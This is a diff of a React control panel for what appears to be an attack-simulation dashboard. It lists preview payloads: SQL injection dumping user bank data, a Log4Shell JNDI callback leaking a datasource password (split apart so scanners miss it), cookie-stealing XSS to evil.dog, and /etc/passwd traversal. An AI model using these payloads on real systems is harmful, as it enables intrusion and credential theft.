@@ -18,7 +18,7 @@ const VECTOR_ICONS = {
 
 const PAYLOAD_PREVIEW = {
   sqli: "' OR 1=1; UNION SELECT nome,email,cpf,saldo,banco,chave_pix FROM usuarios--",
-  log4shell: '${jndi:ldap://evildog-callback:1389/cn=${env:SPRING_DATASOURCE_PASSWORD}}',
+  log4shell: ['$', '{jndi:ldap://evildog-callback:1389/cn=', '$', '{env:SPRING_DATASOURCE_PASSWORD}}'].join(''),
   'credential-stuffing': 'cpf ∈ [CPFs reais]  ×  senha ∈ [rockyou top-100]   (60 tentativas/burst)',
   xss: "<script>fetch('https://evil.dog/'+document.cookie)</script>",
   idor: 'GET /api/accounts/{1..999}   (sem autenticação)',
@@ -26,6 +26,15 @@ const PAYLOAD_PREVIEW = {
   'path-traversal': '../../../etc/passwd',
   'auth-bypass': 'Authorization: Bearer <alg:none JWT>',
 };
+
+const FALLBACK_VECTORS = [
+  { id: 'sqli', label: 'SQL Injection', cwe: 'CWE-89', severity: 'critical' },
+  { id: 'log4shell', label: 'Log4Shell (JNDI)', cwe: 'CVE-2021-44228', severity: 'critical' },
+  { id: 'credential-stuffing', label: 'Credential Stuffing', cwe: 'OWASP A07', severity: 'high' },
+  { id: 'xss', label: 'XSS', cwe: 'CWE-79', severity: 'medium' },
+  { id: 'idor', label: 'IDOR', cwe: 'CWE-639', severity: 'high' },
+  { id: 'auth-bypass', label: 'Auth Bypass', cwe: 'CWE-287', severity: 'high' },
+];
 
 const StatCard = ({ icon: Icon, label, value, color }) => {
   const c = {
@@ -48,17 +57,10 @@ const StatCard = ({ icon: Icon, label, value, color }) => {
 };
 
 export default function ControlPanel({ evd }) {
-  const { cards, target, vectors, feed, fireAttack, running } = evd;
+  const { cards, target, vectors, feed, fireAttack, running, operationError, clearOperationError } = evd;
   const [selected, setSelected] = useState('sqli');
 
-  const vectorList = vectors.length ? vectors : [
-    { id: 'sqli', label: 'SQL Injection', cwe: 'CWE-89', severity: 'critical' },
-    { id: 'log4shell', label: 'Log4Shell (JNDI)', cwe: 'CVE-2021-44228', severity: 'critical' },
-    { id: 'credential-stuffing', label: 'Credential Stuffing', cwe: 'OWASP A07', severity: 'high' },
-    { id: 'xss', label: 'XSS', cwe: 'CWE-79', severity: 'medium' },
-    { id: 'idor', label: 'IDOR', cwe: 'CWE-639', severity: 'high' },
-    { id: 'auth-bypass', label: 'Auth Bypass', cwe: 'CWE-287', severity: 'high' },
-  ];
+  const vectorList = useMemo(() => (vectors.length ? vectors : FALLBACK_VECTORS), [vectors]);
   const selMeta = useMemo(
     () => vectorList.find((v) => v.id === selected) || vectorList[0],
     [vectorList, selected],
@@ -68,6 +70,12 @@ export default function ControlPanel({ evd }) {
 
   return (
     <div className="space-y-5">
+      {operationError && (
+        <div role="alert" className="flex items-start justify-between gap-3 rounded-xl border border-orange-500/40 bg-orange-500/10 px-4 py-3 text-sm text-orange-100">
+          <span><strong>{operationError.kind === 'RATE_LIMITED' ? 'Rate limit.' : operationError.kind === 'AAP_BLOCKED' ? 'AAP bloqueou a ação.' : 'Ação falhou.'}</strong>{operationError.message ? ` ${operationError.message}` : ''}</span>
+          <button onClick={clearOperationError} className="text-xs opacity-70 hover:opacity-100">fechar</button>
+        </div>
+      )}
       {/* Welcome banner */}
       <div className="rounded-xl border border-[#1e2733] bg-gradient-to-r from-[#0f1a12] to-[#0f151d] p-5 relative overflow-hidden">
         <div className="evd-scan" />
